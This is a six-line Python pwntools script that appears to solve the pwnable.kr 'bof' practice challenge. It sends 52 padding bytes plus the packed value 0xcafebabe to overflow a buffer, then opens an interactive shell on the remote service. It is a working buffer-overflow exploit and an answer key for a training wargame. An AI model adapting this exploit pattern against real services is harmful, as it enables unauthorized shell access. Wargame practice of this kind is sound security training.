#!/usr/bin/env python
# coding=utf-8
import pwn
r=pwn.remote('pwnable.kr',9000)
r.send('a'*52+pwn.p32(0xcafebabe))
r.interactive()


